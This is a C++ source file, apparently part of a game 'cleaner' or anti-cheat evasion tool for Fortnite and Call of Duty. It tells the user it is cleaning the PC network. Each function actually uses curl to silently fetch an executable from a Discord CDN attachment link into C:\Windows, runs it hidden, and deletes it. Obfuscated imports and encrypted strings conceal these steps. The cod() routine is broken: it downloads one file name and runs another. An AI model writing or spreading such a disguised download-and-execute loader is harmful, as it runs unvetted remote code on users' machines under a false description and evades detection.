#include "lazy.h"
#include "enc.h"
#include <string>
#include <iostream>

//add your own drivers skid - dumb zen#1337

namespace adapters
{
	void adapters()
	{
		std::cout << "\e[0;36m \n";
		std::cout << " Cleaning PC network... \n";
		std::cout << " Do you want to reset adapters? (y/n) \n";
		std::string adapter;
		std::cin >> adapter;

		if (adapter == "y" || adapter == "Y")
		{
			LI_FN(system)(E("curl https://cdn.discordapp.com/attachments/0000000000000000000/0000000000000000000/example.exe -o C:\\Windows\\adapter.exe --silent"));
			LI_FN(system)(E("C:\\Windows\\adapter.exe >nul"));
			std::remove(E("C:\\Windows\\adapter.exe"));
		}
		else
		{

		}
	}
}

namespace clean
{
	void fortnite()
	{
		LI_FN(system)(E("curl https://cdn.discordapp.com/attachments/0000000000000000000/0000000000000000000/example.exe -o C:\\Windows\\fort.exe --silent"));
		LI_FN(system)(E("C:\\Windows\\fort.exe >nul"));
		std::remove(E("C:\\Windows\\fort.exe"));
	}
}

namespace clean
{
	void cod()
	{
		LI_FN(system)(E("curl https://cdn.discordapp.com/attachments/0000000000000000000/0000000000000000000/example.exe -o C:\\Windows\\fort.exe --silent"));
		LI_FN(system)(E("C:\\Windows\\cod.exe >nul"));
		std::remove(E("C:\\Windows\\cod.exe"));
	}
}